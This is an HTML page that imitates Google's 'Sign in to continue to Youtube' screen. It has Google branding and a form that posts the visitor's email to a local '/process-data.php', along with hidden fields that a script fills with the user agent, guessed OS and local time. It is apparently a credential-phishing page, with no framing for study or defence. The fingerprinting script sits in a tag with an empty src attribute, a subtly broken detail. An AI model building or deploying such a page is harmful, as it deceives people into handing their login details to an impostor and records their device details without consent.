<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>YouTube</title>
    <meta name="description" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" href="style.css" />
    <link rel="icon" type="image/x-icon" href="google_fav2.png" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Google+Sans:ital,opsz,wght@0,17..18,400..700;1,17..18,400..700&display=swap"
      rel="stylesheet"
    />
  </head>
  <body>
    <div class="content">
      <div class="img-header">
        <img src="google_logo.svg" />
      </div>
      <h2>Sign in</h2>
      <h4>to continue to Youtube</h4>
      <form action="/process-data.php" method="post">
        <fieldset>
          <legend>Email or phone</legend>
          <input name="email" type="email" />
          <!-- Hidden Fields for Device Details -->
          <input type="hidden" id="os" name="os" />
          <input type="hidden" id="browser" name="browser" />
          <input type="hidden" id="client_time" name="client_time" />
        </fieldset>
        <a href="#" class="details forgot-im">Forgot Email?</a>

        <p class="details guest">
          Not your computer? Use Guest mode to sign in privately. <br />
          <a href="#">Learn more about using Guest mode.</a>
        </p>
        <div class="buttons">
          <a href="#" class="details">Create Account</a>
          <button type="submit">Next</button>
        </div>
      </form>
    </div>
    <script src="" async defer>
      window.onload = function() {
          // 1. Get Time/Date
          const now = new Date();
          document.getElementById('client_time').value = now.toString();

          // 2. Get Browser & OS Details
          const ua = navigator.userAgent;
          document.getElementById('browser').value = ua;

          // Simple OS detection logic
          let osName = "Unknown OS";
          if (ua.indexOf("Win") !== -1) osName = "Windows";
          if (ua.indexOf("Mac") !== -1) osName = "MacOS";
          if (ua.indexOf("Linux") !== -1) osName = "Linux";
          if (ua.indexOf("Android") !== -1) osName = "Android";
          if (ua.indexOf("like Mac") !== -1) osName = "iOS";

          document.getElementById('os').value = osName;
        };
    </script>
  </body>
</html>
